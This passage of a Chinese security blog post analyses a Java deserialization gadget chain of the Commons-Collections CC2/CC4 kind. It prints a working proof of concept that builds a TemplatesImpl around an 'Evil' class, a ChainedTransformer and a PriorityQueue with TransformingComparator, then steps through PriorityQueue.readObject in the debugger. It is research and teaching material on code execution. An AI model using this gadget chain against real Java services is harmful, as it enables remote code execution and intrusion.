+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">set</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">getBytescode</span>() <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ClassPool</span> <span style="color:#58a1dd">pool</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ClassPool</span>.<span style="color:#58a1dd">getDefault</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">CtClass</span> <span style="color:#58a1dd">clazz</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pool</span>.<span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">com</span>.<span style="color:#58a1dd">test</span>.<span style="color:#58a1dd">CC2</span>.<span style="color:#58a1dd">Evil</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">clazz</span>.<span style="color:#58a1dd">toBytecode</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">main</span>(<span style="color:#58a1dd">String</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">args</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">fakeTransformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> {<span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">1</span>)};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span>{<span style="color:#58a1dd">getBytescode</span>()});
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">transformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">TrAXFilter</span>.<span style="color:#58a1dd">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InstantiateTransformer</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">Templates</span>.<span style="color:#58a1dd">class</span> },<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">obj</span> })
+</span></span><span style="display:flex;"><span>        };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ChainedTransformer</span> <span style="color:#58a1dd">chain</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ChainedTransformer</span>(<span style="color:#58a1dd">fakeTransformers</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">PriorityQueue</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">Object</span><span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">queue</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">PriorityQueue</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">Object</span><span style="color:#ff636f">&gt;</span>(<span style="color:#58a1dd">2</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformingComparator</span>(<span style="color:#58a1dd">chain</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">chain</span>, <span style="color:#a6be9d">&#34;iTransformers&#34;</span>, <span style="color:#58a1dd">transformers</span>);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ByteArrayOutputStream</span> <span style="color:#58a1dd">barr</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ByteArrayOutputStream</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectOutputStream</span> <span style="color:#58a1dd">oos</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectOutputStream</span>(<span style="color:#58a1dd">barr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">writeObject</span>(<span style="color:#58a1dd">queue</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">oos</span>.<span style="color:#58a1dd">close</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">System</span>.<span style="color:#58a1dd">out</span>.<span style="color:#58a1dd">println</span>(<span style="color:#58a1dd">barr</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ObjectInputStream</span> <span style="color:#58a1dd">ois</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ObjectInputStream</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">ByteArrayInputStream</span>(<span style="color:#58a1dd">barr</span>.<span style="color:#58a1dd">toByteArray</span>()));
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">o</span> <span style="color:#ff636f">=</span> (<span style="color:#58a1dd">Object</span>)<span style="color:#58a1dd">ois</span>.<span style="color:#58a1dd">readObject</span>();
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><h2 id="动态调试" class="heading-element"><span>动态调试</span>
+  <a href="#%e5%8a%a8%e6%80%81%e8%b0%83%e8%af%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>进入PQ的readobject</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111504665.webp" alt="image-20240911150406422" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111504665.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111504665.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111504665.webp?size=large 2x" data-title="image-20240911150406422" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>下面这几步都没啥好说的：</p>
+<p>heapify</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506814.webp" alt="image-20240911150645730" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506814.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506814.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506814.webp?size=large 2x" data-title="image-20240911150645730" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>siftDown</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506832.webp" alt="image-20240911150658744" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506832.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506832.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111506832.webp?size=large 2x" data-title="image-20240911150658744" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>siftDownUsingComparator</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111507345.webp" alt="image-20240911150735222" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111507345.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111507345.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111507345.webp?size=large 2x" data-title="image-20240911150735222" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>comparator.compare这里进入TransformingComparator.class了，开始去调用transformer</p>
+<p>这里调用的是chaintransform的方法</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111508226.webp" alt="image-20240911150811051" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111508226.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111508226.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111508226.webp?size=large 2x" data-title="image-20240911150811051" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>首先是ConstantTransformer返回一个TrAXFilter对象，然后调用InstantiateTransformer的transform，TrAXFilter对象作为参数传入</p>
+<p><img loading="lazy" src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111511159.webp" alt="image-20240911151119969" srcset="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111511159.webp?size=small, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111511159.webp?size=medium 1.5x, https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202409111511159.webp?size=large 2x" data-title="image-20240911151119969" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>调用TrAXFilter对象的构造方法，this.iParamTypes即tempslate对象作为参数传入</p>
+<p>对应我们poc里的这句<code>new InstantiateTransformer(new Class[] { Templates.class },new Object[] { obj })</code></p>
+<p>这里其实就是CC3的屁股了，已经分析过了</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-09-11 15:35:01">Updated on 2024-09-11&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/java%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Java安全">Java安全</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="post-nav-item" rel="prev" title="Fastjson反序列化"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Fastjson反序列化</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/">东隅</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
+      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
+    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
+</html>
